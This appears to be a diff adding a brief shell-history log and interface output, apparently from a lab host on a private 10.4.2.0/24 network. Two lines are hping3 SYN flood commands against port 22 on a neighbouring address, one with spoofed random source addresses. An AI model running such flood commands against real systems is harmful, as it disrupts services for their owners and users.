@@ -1,0 +1,10 @@
+  177  hping3 --count 1500 --data 120 --syn --win 64 -p 22 --flood --rand-source 10.4.2.154
+  178  ip a
+  179  hping3 --count 1500 --data 120 --syn --win 64 -p 22 --flood 10.4.2.154
+
+eth0: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc fq_codel state UP group default qlen 1000
+    link/ether 52:54:00:ab:bc:64 brd ff:ff:ff:ff:ff:ff
+    inet 10.4.2.155/24 brd 10.4.2.255 scope global eth0
+       valid_lft forever preferred_lft forever
+    inet6 fe80::5054:ff:feab:bc64/64 scope link
+       valid_lft forever preferred_lft forever
